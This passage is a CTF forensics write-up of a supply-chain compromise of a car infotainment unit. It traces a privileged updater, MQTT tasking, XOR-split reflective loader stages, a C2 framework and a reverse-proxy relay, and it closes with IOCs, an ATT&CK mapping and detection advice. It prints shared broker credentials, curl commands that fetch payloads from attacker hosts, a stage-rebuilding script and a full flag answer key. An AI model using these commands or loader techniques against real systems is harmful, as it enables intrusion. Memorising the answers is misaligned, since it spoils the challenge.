| S05 | Poisoned Branch | [../2026-09-19-holmes2026-s05-poisoned-branch/](../2026-09-19-holmes2026-s05-poisoned-branch/) |
| **S06** | **Silent Passenger** ← *estás aquí* | [../2026-09-20-holmes2026-s06-silent-passenger/](../2026-09-20-holmes2026-s06-silent-passenger/) |
| S07 | Iron Feather | [../2026-09-21-holmes2026-s07-iron-feather/](../2026-09-21-holmes2026-s07-iron-feather/) |
| S08 | Borrowed Name | [../2026-09-22-holmes2026-s08-borrowed-name/](../2026-09-22-holmes2026-s08-borrowed-name/) |
| S09 | Last Light | [../2026-09-23-holmes2026-s09-last-light/](../2026-09-23-holmes2026-s09-last-light/) |

---

<a id="en"></a>

## 🇬🇧 English

### Scenario

A parked vehicle served as a **disposable relay** in the DIOGENES operation. Its infotainment head unit (embedded Android Automotive from a Chinese integrator) was compromised not by a noisy exploit but by a **software supply chain**: a legitimate OEM updater —signed and privileged— pushed a malicious app, which then pulled *stage after stage* until it planted an implant that turns the car into an **egress proxy node** for the C2. Not a single 0-day: every link is *trusted software* being abused.

The design is deliberately uncomfortable for the analyst: **nothing "exploits" anything**; an OEM product does exactly what it's built to do —update itself— pointed at the attacker's infrastructure. The forensic work is to reconstruct the loading chain without running anything on a real phone/car, following **Java reflection** and **`DexClassLoader`** layer by layer, and hashing every reconstructed object.

The challenge ships the dumped firmware:

- **`fw/system.img`** — the `/system` **ext4** partition, ~944 MB. The privileged APK lives here.
- **`fw/5a2f8d64-…{0,1,2}`** — three slices (419+419+105 MB) of another partition dumped by UUID (userdata/cache); not needed for the chain, but they confirm a real device dump.
- **`fw/5d1809fc-…`** (67 MB) and **`fw/597b623a-…`** (17 MB) — auxiliary partition blobs (boot/recovery/vendor).
- **`fw/History.txt`** — the integrator's internal changelog, in Chinese, with years of 钛马星 (TWCore) entries, "兜风" (*DoFun*) themes, `adb-carnet`, `ID100` limits, `Dofun Launcher`… the cultural fingerprint that anchors the ecosystem.
- A **PDF** ("Holmes CTF 2026 Sherlock 06.pdf") that only carries narrative; no flag comes from it.

Difficulty: **hard**. 20 flags, from APK extraction to the GPS coordinates where the car was enrolled as a relay.

> The challenge closely replicates the real case documented by **Securelist / Kaspersky** on the **DoFun / Android head-unit botnet** (TWCore/钛马星, `cardoor.cn`, the *JarService* dropper, the *zhima* proxy-module family, attributed to *MoYu Group* and overlapping with the *BADBOX* ecosystem). Reading that report gives the whole chain and saves hours; this writeup's IOCs match it. Primary reference: `securelist.com/android-head-unit-malware/121106/`.

### Artifact and tools

**Explore the ext4 WITHOUT root and WITHOUT re-mounting 3 GB.** The image is large and you don't need to mount it whole: `debugfs` walks the filesystem and extracts objects read-only, unprivileged.

```bash
cd /path/SilentPassenger/fw

# 1) Confirm file types
file system.img            # -> Linux rev 1.0 ext4 filesystem data ...
file 5a2f8d64-*.0          # raw partition slice (data)

# 2) Navigate the /system tree WITHOUT mounting
debugfs -R "ls -l /"                    system.img
debugfs -R "ls -l /system/priv-app"     system.img
debugfs -R "ls -l /system/app"          system.img

# 3) Extract ONLY what matters (read-only, no 944 MB loop-mount)
debugfs -R "dump /system/priv-app/TWCore/TWCore.apk ./TWCore.apk" system.img

# Alternatives if you'd rather mount (needs root):
#   sudo mount -o ro,loop system.img /mnt/sysimg
#   binwalk -e system.img          # generic carve
```

**Quick triage before RE** — a `strings`/`grep` pass over the image orients you, though the bulk is encrypted/compressed inside the DEX:

```bash
strings -n 8 fw/History.txt | head           # 钛马星/DoFun ecosystem
grep -aboiE 'HTB\{[^}]{1,80}\}' system.img    # (no plaintext flags: this is DFIR)
grep -aboiE 'cardoor|dofun|ishano|carnet' system.img | head
```

**APK/DEX analysis.** The heart of the challenge is following reflection + `DexClassLoader`. Tools:

```bash
# Decompile to readable Java
jadx -d out_twcore TWCore.apk
# or the smali tree + resources to inspect raw byte arrays
apktool d -o out_twcore_smali TWCore.apk
# dex2jar + a decompiler if jadx chokes on an obfuscated stage
d2j-dex2jar classes.dex -o classes.jar
```

**Hashing** — six flags are SHA-256 of stages/modules: you must **hash every reconstructed artifact**, not read strings.

```bash
sha256sum TWCore.apk stage2.jar sdk.jar module_final.jar
md5sum    jarservice-v1.12.apk        # the updater compares MD5 ("key" field)
```

**Network / C2 (in the challenge lab).** The firmware is static, but the CTF stands up the attacker infrastructure in Docker so you can request the next stages live. MQTT and HTTP clients:

```bash
pip install paho-mqtt
mosquitto_sub -h mqtt.car.cardoor.cn -p 1883 -u dofun -P dofun666666 \
  -t 'dofun/car/config/#' -v            # captures the retained update message
# RSA-encrypted POSTs to /api/rsaUpdate and /cpc/api/* are replicated with a
# small Python client (requests + pycryptodome) reusing the pubkey/privkey
# embedded in the stages themselves (r.a / r.b, bb.b).
```

### Methodology (step by step, with the *why*)

#### 1 · Entry point — the privileged updater (Flag 1)

Under `/system/priv-app/` —the directory of **system apps signed with the platform key**— sits `TWCore/TWCore.apk` (钛马星). On Android, `priv-app` is the equivalent of a binary in `System32`: it gets *privileged permissions* a normal app cannot request (silent package install/remove, `INSTALL_PACKAGES`, `DEVICE_POLICY` management…). That the vector lives here **is** the finding: the supply chain doesn't need to break anything, it already starts at maximum trust.

```bash
debugfs -R "dump /system/priv-app/TWCore/TWCore.apk ./TWCore.apk" system.img
sha256sum TWCore.apk
# d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2
```

**Flag 1:** `/system/priv-app/TWCore/TWCore.apk:d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2`

#### 2 · Region selection (Flag 2)

Decompiling TWCore with `jadx`, the startup logic picks its *service region* with a method like `lB()` combining **the device `Locale`** with a system property read via `SystemProperties.get(...)`: `ro.com.google.gmsversion`. The malware's reasoning: a Chinese head unit **without Google Mobile Services** leaves that property **empty** and usually ships `zh_CN`; that combination routes the car to the `dofun`/`cardoor.cn` (domestic) infrastructure rather than the *overseas* variant. It's a fleet-segmentation switch, not a security check.

**Flag 2:** `ro.com.google.gmsversion`

#### 3 · Tasking channel — MQTT (Flag 3)

TWCore's strings reveal the command broker: `tcp://mqtt.car.cardoor.cn:1883` with embedded credentials `dofun:dofun666666`. MQTT is the *fleet C2*: a single broker pushes update instructions to **every** subscribed car without the operator touching each device. The credentials are shared fleet-wide (typical of IoT), which makes them a first-class IOC.

```bash
mosquitto_sub -h mqtt.car.cardoor.cn -p 1883 -u dofun -P dofun666666 -t '#' -v
```

**Flag 3:** `tcp://mqtt.car.cardoor.cn:1883|dofun:dofun666666`

#### 4 · Fleet topic filter (Flag 4)

TWCore subscribes to the wildcard *topic filter* `dofun/car/config/#`. The `#` captures the whole config subtree; in the lab the **retained message** arrives specifically at `dofun/car/config/upgrade` with the delivery payload:

```json
{"package":"com.tw.jar1","flag":12,
 "path":"http://core.car.dofuncar.com/.../jarservice-v1.12.apk",
 "key":"6c2e34b30da42085240ede53ab6107d4",
 "not_exist_install":true}
```

The **`dofun/`** prefix (not `overseas/`) confirms the Flag 2 nuance: the head unit lives in the Chinese region. `not_exist_install:true` = "install only if absent" → stealth.

**Flag 4:** `dofun/car/config/#`

#### 5 · Delivered app (Flag 5)

The message's `path` points to `jarservice-v1.12.apk`; it's downloaded and its **MD5 matches the message's `key` field** (`6c2e34b30da42085240ede53ab6107d4`) → integrity verified by the malware itself, confirming this is the delivered app. The package is `com.tw.jar1`, a **reflective loader** (the dropper Securelist calls **JarService**), previously absent from `/system`.

```bash
curl -s http://core.car.dofuncar.com/.../jarservice-v1.12.apk -o jar1.apk
md5sum jar1.apk    # 6c2e34b30da42085240ede53ab6107d4  == "key" field
jadx -d out_jar1 jar1.apk
```

**Flag 5:** `com.tw.jar1:12:6c2e34b30da42085240ede53ab6107d4`

#### 6 · Reflective entry point + campaign channel (Flags 6 and 17)

Inside `com.tw.jar1`, the dropper doesn't call its next stage by static name: it does so by **reflection**. The target class/method is `com.c.j.qbh.wa` and the encoded *campaign channel* is `2039`. The push framing that triggers the load was `0500` + `H26STAGE01` + `00000000` + base64url (task header + stage id + padding + blob).

The **DEX method descriptor** invoked by reflection (parameter and return types only, as `baksmali`/`jadx` render it) is `(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IIII)V` — a `Context`, two `String`s and four `int`s, returning `void`. That descriptor is Flag 17 (the module that ultimately consumes it is the relay; the signature propagates through the whole invocation chain).

**Flag 6:** `com.c.j.qbh.wa:2039`
**Flag 17:** `(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IIII)V`

#### 7 · Reconstruct the next stage (Flags 7 and 8)

Here's the first RE trick. Stage 2 **is not** a file: it's **split and encrypted** inside the dropper across **30 byte arrays** (fields like `c.b..l.d`), reassembled at runtime by applying `XOR (30 - i)` to each array `i` before concatenating and passing them to `DexClassLoader`. You replicate that algorithm statically (reading the arrays as `jadx` renders them) to dump the real JAR:

```python
# rebuild_stage2.py  (sketch)
parts = [arr0, arr1, ..., arr29]              # 30 byte[] extracted from jadx
out = bytearray()
for i, p in enumerate(parts):
    out += bytes(b ^ ((30 - i) & 0xff) for b in p)
open("stage2.jar", "wb").write(out)           # contains classes.dex (com.c.j)
```

```bash
sha256sum stage2.jar
# cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c
```

Decompiling `stage2.jar` (`com.c.j`), its `m.java` sets the default `dexVersion` `f = "1.7"`: that's how it **identifies itself to its update infrastructure**.

**Flag 7:** `cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c`
**Flag 8:** `1.7`

#### 8 · Concealed update request → next object (Flags 9, 10 and 11)

Stage 2 uses **`DexClassLoader`** for the next load and talks to its C2 over a deliberately obfuscated channel. In `stage2` (`m.java`/`r.java`/`o.java`):

- The real endpoint is `e = "/api/rsaUpdate"`, but it **never travels in cleartext**: `r.a(host, json)` does an **RSA**-encrypted `POST` (embedded pubkey `r.a`) to an innocuous-looking path `host/apiv2/<blob>`, where `<blob>` **hides** `/api/rsaUpdate` via `XOR` with key `Mu^38Ydeo233Uowd` + nonce + timestamp. The response is decrypted with the **embedded privkey** `r.b`.
- The request JSON carries `userId, dexVersion(=1.7), dexType, channelId, packageName, appVersion, appName`.
- The real host is `a1.ishano456.sbs`.

Replicating the client (reusing `r.a`/`r.b`), the service responds:

```json
{"code":200,"data":{"dexUrl":"http://127.0.0.1/vr34der34/dex3.68.png",
                     "dexVersion":3.68,"status":0}}
```

The `dexUrl` field points to `/vr34der34/dex3.68.png` — a **fake `.png` extension** that is actually an **executable archive** (JAR/DEX) XOR-encrypted; per `c.java` it decodes to `sdk.jar`. The path is *host-independent* (only the path matters; the host rotates).

```bash
curl -s http://127.0.0.1/vr34der34/dex3.68.png -o dex3.68.png
python3 xor_decode.py dex3.68.png sdk.jar     # decodes to sdk.jar
sha256sum sdk.jar
# 79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d
```

**Flag 9:** `/api/rsaUpdate`
**Flag 10:** `/vr34der34/dex3.68.png`
**Flag 11:** `79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d`

#### 9 · Control stage / C2 framework (Flags 12, 13 and 14)

`sdk.jar` is the brain: entry `com.ast.sdk.BillingMain` + a **custom C2 framework** in `com/a/b/a/*` (~85 classes, with a `ServerSocket` on `:12101`). All its endpoints are **encoded** (table `aq.a`); decoding them yields `/cpc/api/device`, `/cpc/api/task`, `/cpc/api/proxy/origin`, `/cpc/api/xml`, `/cpc/api/report`, `/api/init…`, `/task/reportTaskLocationPhone`, `/task/traceroute`.

**First configuration request** (in `a.run()`):

```java
// n.a().a( am.c() + am.j + ap.b + "&rsa=1&channelId=" + appId )
//   am.c() = task host (a1.ishano456.sbs) ; am.j = "/api/init?configVersion="
//   ap.b   = "3.8" (config version)       ; appId = 2039 (channel)
```

→ request-target `/api/init?configVersion=3.8&rsa=1&channelId=2039`. The response (RSA, privkey `bb.b`) comes back with `code:100` and **rotates the hosts** to `t2/a2.tshaoushn3.xyz`, with `taskApi=/cpc/api/task`, `reportApi=/cpc/api/report`, `tagName="config"`.

**Implant registration** = `POST` RSA(JSON) to `<taskhost>/cpc/api/task` with `Content-Type: application/octet-stream`; JSON `absDevice, appInfo, channelId=2039, dexVersion=3.68, configVersion`. Response:

```json
{"code":200,"data":{"orderId":20260001,
  "tasks":[{"productId":4532,"taskId":34337681,"version":1787907664,"rank":10}]}}
```

→ tuple `product:task:version` = `4532:34337681:1787907664`.

The **implant UID** is delivered separately by `GET /cpc/api/proxy/origin` in its `data` field → `00005bp`.

**Flag 12:** `/api/init?configVersion=3.8&rsa=1&channelId=2039`
**Flag 13:** `00005bp`
**Flag 14:** `4532:34337681:1787907664`

#### 10 · Final-module delivery (Flags 15 and 16)

The framework requests the task *script* with `GET /cpc/api/xml?productId=4532`. It returns an operation with `tagName` **`loadlib2`**, handled by class `bn`:

```json
{"loadType":1,"method":"start",
 "url2":"http://.../sh65.io","md52":"de77c3303e93c9450424759f1741441c",
 "className":"com.miyc.transfer.Client","tagName":"loadlib2",
 "params":["<Context>","127.0.0.1","1002",9999,7777,8888,"20000"],
 "url":"http://.../sh66.io","md5":"71ab5517f71866279d0d87d37f2ae320"}
```

The analysis key: `loadlib2` can load two objects (`url`/`url2`), but the **final module** is the one in the **`url`** field (`sh66.io`, md5 `71ab5517…`); `url2` (`sh65.io`) is an auxiliary library. Hence the answer `loadlib2:url`. Downloaded and md5-verified, then hashed:

```bash
curl -s http://.../sh66.io -o module_final.jar
md5sum module_final.jar     # 71ab5517f71866279d0d87d37f2ae320
sha256sum module_final.jar
# 906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963
```

**Flag 15:** `loadlib2:url`
**Flag 16:** `906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963`

#### 11 · Relay module (Flags 18 and 19)

The final module is `com.miyc.transfer` (Securelist's *zhima* proxy): a **reverse HTTP/SOCKS proxy** that turns the car into an egress node. `bn` loads it with `DexClassLoader` and invokes `com.miyc.transfer.Client.start(Context, String, String, int, int, int, int)` — which is why the Flag 17 DEX descriptor is `(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IIII)V`. From the script's `params`, the **four integers** passed to the entry point, in invocation order, are `9999,7777,8888,20000` (ports of the proxy's various channels).

When **opening the primary command channel** (to `127.0.0.1:9999`), in `e.f()` the module writes `this.f = u.a(g.h, uid.getBytes())` with `g.h = 0x33`. The function `u.a(byte b, byte[] data)` composes a TLV frame:

| field | bytes (hex) | meaning |
|-------|-------------|---------|
| `g.h` | `33` | tag 0x33 (1 byte) |
| constant | `00000042` | 66 (int32 BE) |
| length | `00000007` | `len("00005bp") = 7` |
| uid | `30303030356270` | `"00005bp"` in ASCII |

= 16 bytes → 32 hex. The suffix `30303030356270` is exactly the UID `00005bp` (Flag 13) in ASCII: the **auth frame ties the relay module to the implant identity**.

**Flag 18:** `9999,7777,8888,20000`
**Flag 19:** `33000000420000000730303030356270`

#### 12 · Operational use — relay coordinates (Flag 20)

The last flag isn't in the firmware: it comes from **emulating the relay against the live C2**. The command channel (30184) after auth only emits one frame `g.e → 127.0.0.1:7777` and closes; the target is internal to Docker. The key was opening **two sockets at once** —the control channel with *heartbeats* (`0x34`, byte `g.i`) and the data channel bound by the *seq*— so the C2 pushed the *follow-on operation* HTTP request through the relay:

```
GET http://198.51.100.7/relay/enroll?relayId=00005bp&role=drone-control
    &latitude=51.4997000&longitude=-0.1608000 HTTP/1.1
```

The car is **enrolled as a `drone-control` relay** at `51.4997000,-0.1608000` — Pavilion Road car park (Knightsbridge, London). The `role=drone-control` and those coordinates **tie the S06 operational window to the S07 aerial asset** (*Iron Feather*, a PX4 drone): the next lead is literally "in the air".

**Flag 20:** `51.4997000,-0.1608000`

**Full chain:** `TWCore` (priv. updater) → MQTT push (`cardoor.cn`) → `com.tw.jar1` (reflective loader, channel 2039) → stage `com.c.j` (DexClassLoader, `/api/rsaUpdate`) → `sdk.jar` (C2 framework `com.a.b.a`, `/cpc/api/*`) → `com.miyc.transfer` (reverse proxy, egress node) → `drone-control` enroll @ Pavilion Road.

<a id="respuestas-en"></a>

### Answers / flags (summary)

| # | Question | Answer |
|---|----------|--------|
| 1 | Which privileged Android package is responsible for the unauthorized application delivery? | `/system/priv-app/TWCore/TWCore.apk:d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2` |
| 2 | Which Android system property is evaluated alongside the device locale when TWCore selects its service region? | `ro.com.google.gmsversion` |
| 3 | Which MQTT service and credentials does TWCore use for the affected service region? | `tcp://mqtt.car.cardoor.cn:1883\|dofun:dofun666666` |
| 4 | Which MQTT topic filter exposes update instructions shared with the affected fleet? | `dofun/car/config/#` |
| 5 | Which previously absent application was delivered through the updater? | `com.tw.jar1:12:6c2e34b30da42085240ede53ab6107d4` |
| 6 | What reflective entry point and campaign channel are recovered from the delivered application? | `com.c.j.qbh.wa:2039` |
| 7 | What is the SHA-256 of the next executable stage reconstructed from the delivered application? | `cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c` |
| 8 | Which version does the reconstructed stage identify itself as when contacting its update infrastructure? | `1.7` |
| 9 | Which API endpoint is concealed in the reconstructed stage's generated update request? | `/api/rsaUpdate` |
| 10 | What host-independent path identifies the next object returned by the update service? | `/vr34der34/dex3.68.png` |
| 11 | What is the SHA-256 of the executable archive recovered from that object? | `79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d` |
| 12 | What is the first configuration request-target generated by the recovered control stage? | `/api/init?configVersion=3.8&rsa=1&channelId=2039` |
| 13 | Which UID is assigned to the implant by the registration service? | `00005bp` |
| 14 | Which product, task, and version tuple is assigned to the implant? | `4532:34337681:1787907664` |
| 15 | Which script operation delivers the final module, and which field supplies its location? | `loadlib2:url` |
| 16 | What is the SHA-256 of the final downloaded module? | `906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963` |
| 17 | What is the DEX method descriptor (parameter and return types only) of the module entry point invoked by the control stage? | `(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IIII)V` |
| 18 | Which four integer values are passed to the final module entry point in invocation order? | `9999,7777,8888,20000` |
| 19 | What authentication frame does the module send when opening its primary command channel? | `33000000420000000730303030356270` |
| 20 | At what coordinates was the relay parked? | `51.4997000,-0.1608000` |

<a id="cronologia-en"></a>

### Timeline

| Phase | Event | Artifact / IOC |
|-------|-------|----------------|
| T0 | Legitimate OEM firmware (2019–2024, see `History.txt`), Chinese integrator 钛马星/DoFun | `system.img`, `Dofun Launcher` |
| T1 | `TWCore` (priv-app) selects region `dofun` via locale + empty `ro.com.google.gmsversion` | `TWCore.apk` |
| T2 | MQTT broker publishes a fleet-wide retained update message | `dofun/car/config/upgrade` |
| T3 | Silent download + install of dropper `com.tw.jar1` (JarService) | `jarservice-v1.12.apk`, MD5 `6c2e34b3…` |
| T4 | Dropper rebuilds stage 2 (30×XOR) and loads it by reflection (channel 2039) | `stage2.jar` `com.c.j` |
| T5 | Stage 2 makes an RSA update request to `/api/rsaUpdate`; gets `dexUrl` with fake `.png` ext | `a1.ishano456.sbs`, `/vr34der34/dex3.68.png` |
| T6 | `sdk.jar` decoded (C2 framework `com.a.b.a`), `/api/init` config 3.8 | `sdk.jar`, SHA `79e01a59…` |
| T7 | Implant registration → UID `00005bp`, task `4532:34337681:…` | `/cpc/api/task`, `/cpc/api/proxy/origin` |
| T8 | `loadlib2` script delivers relay module `com.miyc.transfer` | `sh66.io`, MD5 `71ab5517…` |
| T9 | Relay opens command channel, auth frame carries UID, reverse proxy active | `33000000420000000730303030356270` |
| T10 | C2 enrolls the car as `drone-control` at fixed coordinates → bridge to S07 | `51.4997000,-0.1608000` |

<a id="iocs-en"></a>

### IOCs

**Domains / hosts / infra (challenge lab):**

| Indicator | Port | Role |
|-----------|------|------|
| `mqtt.car.cardoor.cn` | `1883` | MQTT broker (fleet tasking) |
| `core.car.dofuncar.com` | `30182`* | HTTP update / payload server |
| `a1.ishano456.sbs` | `32117`* (TLS) | C2 task host (`/api/rsaUpdate`, `/cpc/api/task`) |
| `t1.ishano456.sbs` | `32117`* (TLS) | C2 config host (`/api/init`) |
| `t2.tshaoushn3.xyz` / `a2.tshaoushn3.xyz` | — | Hosts rotated after `/api/init` (`code:100`) |
| `t1.vrr8345.site` | — | "active" beacon |
| `198.51.100.7` | — | Follow-on op enroll server (TEST-NET-2, documentary) |
| — | `30184`* | Relay command channel (`127.0.0.1:9999`) |
| — | `32051`* → `7777` | Relay data channel (Docker-internal) |
| — | `12101` | Framework `ServerSocket` on the device |

*\*Ports of the CTF Docker environment; the "canonical" firmware IOCs are the domains and `:1883`.*

**Credentials / topics:** `dofun:dofun666666` · `dofun/car/config/#` (retained at `.../upgrade`).

**C2 paths:** `/api/rsaUpdate` · `/apiv2/<blob>` (hides the former, XOR `Mu^38Ydeo233Uowd`) · `/vr34der34/dex3.68.png` · `/api/init?configVersion=3.8&rsa=1&channelId=2039` · `/cpc/api/{device,task,proxy/origin,xml,report}` · `/task/{reportTaskLocationPhone,traceroute}`.

**Hashes:**

| Object | Algorithm | Value |
|--------|-----------|-------|
| `TWCore.apk` (priv-app updater) | SHA-256 | `d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2` |
| `com.tw.jar1` (JarService dropper) | MD5 | `6c2e34b30da42085240ede53ab6107d4` |
| Stage 2 `com.c.j` (reconstructed) | SHA-256 | `cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c` |
| `sdk.jar` (C2 framework `com.a.b.a`) | SHA-256 | `79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d` |
| Relay module `com.miyc.transfer` (`url`) | SHA-256 | `906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963` |
| Relay module `com.miyc.transfer` (`url`) | MD5 | `71ab5517f71866279d0d87d37f2ae320` |
| Auxiliary library (`url2`, `sh65.io`) | MD5 | `de77c3303e93c9450424759f1741441c` |

**Identity:** implant UID `00005bp` · channel/campaign `2039` · tuple `4532:34337681:1787907664` · auth frame `33000000420000000730303030356270`.

<a id="mitre-en"></a>

### MITRE ATT&CK mapping

Mobile supply chain + multi-stage C2 + egress proxy. Enterprise techniques are listed with their **Mobile** equivalent where it applies.

| Tactic | Technique (ID) | Evidence in the case |
|--------|----------------|----------------------|
| Initial Access | Compromise Software Supply Chain — Enterprise **T1195.002** / Mobile **T1474.003** | Privileged OEM updater `TWCore` delivers the malicious app |
| Execution | Command and Scripting Interpreter — Mobile **T1623** | `loadlib2` task script interpreted by the framework |
| Execution / Defense Evasion | Reflective Code Loading **T1620** / Download New Code at Runtime (Mobile) **T1407** | `DexClassLoader` + reflective invocation stage by stage |
| Persistence / Priv. | Compromise Host Software Binary **T1554** (signed priv-app) | App in `/system/priv-app` with platform permissions |
| Defense Evasion | Obfuscated Files or Information **T1027** | 30 XOR arrays, encoded endpoints, fake `.png` extension |
| Defense Evasion | Deobfuscate/Decode Files or Information **T1140** | XOR `(30-i)`, XOR `Mu^38Ydeo233Uowd`, embedded RSA |
| Command & Control | Application Layer Protocol **T1071** / Mobile Web Protocols **T1437.001** | MQTT (fleet) + HTTP(S) `/cpc/api/*` |
| Command & Control | Encrypted Channel **T1573** / Mobile **T1521** | RSA payloads + TLS channel |
| Command & Control | Non-Standard Port **T1571** / Mobile **T1509** | `1883`, `30182`, `32117`, `30184`, `12101` |
| Command & Control | Ingress Tool Transfer **T1105** | Download of stage 2, `sdk.jar`, relay module |
| Command & Control | Dynamic Resolution / host rotation **T1568** | Rotation to `t2/a2.tshaoushn3.xyz` after `/api/init` |
| Impact / C2 | Proxy Through Victim (Mobile) **T1604** / Proxy **T1090** | `com.miyc.transfer` = egress node |
| Collection / Discovery | Location Tracking (Mobile) **T1430** | `reportTaskLocationPhone`, relay coordinates |

<a id="deteccion-en"></a>

### Detection and remediation

**Detection (fleet / OEM SOC):**

- **Anomalous MQTT egress** from head units: connections to `:1883` with shared credentials (`dofun:dofun666666`) and wildcard subscriptions `dofun/car/config/#`. Alert by domain (`cardoor.cn`, `dofuncar.com`, `*.ishano456.sbs`, `*.tshaoushn3.xyz`, `vrr8345.site`).
- **`DexClassLoader` / `dalvik.system.DexClassLoader` at runtime** from system apps — telemetry of DEX loads not signed by the platform; especially files whose extension doesn't match their *magic* (a `.png` starting with `PK`/`dex\n`).
- **Silent installs** originated by `priv-app` (`INSTALL_PACKAGES`) outside the official OTA window; packages `com.tw.jar1`, `com.c.j`, `com.ast.sdk`, `com.miyc.transfer`.
- **`ServerSocket`/proxy** listening on the device (`:12101`, `:9999`, `:7777`, `:8888`, `:20000`) — a head unit should not expose a proxy.
- **YARA/hash matching** over `/system/priv-app` with the IOC-table SHA-256/MD5; `strings` for `Mu^38Ydeo233Uowd`, `/vr34der34/`, `/cpc/api/`, `00005bp`.

**Remediation:**

- **Reflash** from a verified OEM image (the `/system` blobs are compromised; uninstalling an app is not enough when the vector is `priv-app`).
- **Rotate/retire** the shared MQTT credentials and block the C2 domains/hosts on the vehicle network (APN/telemetry).
- **Verified Boot / platform signing:** require `/system/priv-app` to contain only apps signed with the OEM key and with an approved *privileged permissions* manifest; audit the integrator's supply chain (`History.txt` shows dozens of hands touching the firmware).
- **Segmentation:** the head unit must not be able to act as an *egress proxy*; firewall policies preventing arbitrary outbound traffic from the infotainment subsystem.
- **Cross-case threat hunting:** the UID `00005bp` and `role=drone-control` link to S07 — pivot to the drone infrastructure.

### Lessons

- **The supply chain is the exploit.** No 0-day: a signed, privileged OEM updater (`TWCore`) is the vector. In embedded Android, `/system/priv-app` deserves the same suspicion as a binary in `System32`.
- **`DexClassLoader`, stage by stage.** Each stage downloads the next and loads it reflectively, often with a fake extension (a `.png` that is really a JAR/DEX) or split and XOR-encrypted across dozens of arrays. Following the chain means reconstructing each object and re-running `jadx` — reading strings is not enough.
- **Hashes are the evidence.** Six flags are SHA-256 of stages/modules: you must extract and hash each reconstructed artifact.
- **Everything is encrypted/encoded.** Embedded RSA in each stage, XOR'd endpoints (`Mu^38Ydeo233Uowd`), encoded string tables: RE is about locating key+algorithm and **replicating the client**, not intercepting cleartext traffic.
- **Cross-case correlation.** The auth frame (`…30303030356270` = `00005bp`) links the relay module to the implant UID, and `role=drone-control` + the coordinates tie S06 to the S07 aerial asset.
- **Explore ext4 without re-mounting.** `debugfs -R "ls/dump"` on `system.img` avoids mounting 3 GB and gives enough read-only access to extract the APKs.

<a id="serie-en"></a>

### Series · The Reichenbach Directive

| # | Scenario | Link |
|---|----------|------|
| S01 | Silent Dividend | [../2026-09-15-holmes2026-s01-silent-dividend/](../2026-09-15-holmes2026-s01-silent-dividend/) |
| S02 | Bottle Out | [../2026-09-16-holmes2026-s02-bottle-out/](../2026-09-16-holmes2026-s02-bottle-out/) |
| S03 | Whisper Chain | [../2026-09-17-holmes2026-s03-whisper-chain/](../2026-09-17-holmes2026-s03-whisper-chain/) |
| S04 | Paper Ghost | [../2026-09-18-holmes2026-s04-paper-ghost/](../2026-09-18-holmes2026-s04-paper-ghost/) |
| S05 | Poisoned Branch | [../2026-09-19-holmes2026-s05-poisoned-branch/](../2026-09-19-holmes2026-s05-poisoned-branch/) |
| **S06** | **Silent Passenger** ← *you are here* | [../2026-09-20-holmes2026-s06-silent-passenger/](../2026-09-20-holmes2026-s06-silent-passenger/) |
| S07 | Iron Feather | [../2026-09-21-holmes2026-s07-iron-feather/](../2026-09-21-holmes2026-s07-iron-feather/) |
| S08 | Borrowed Name | [../2026-09-22-holmes2026-s08-borrowed-name/](../2026-09-22-holmes2026-s08-borrowed-name/) |
| S09 | Last Light | [../2026-09-23-holmes2026-s09-last-light/](../2026-09-23-holmes2026-s09-last-light/) |
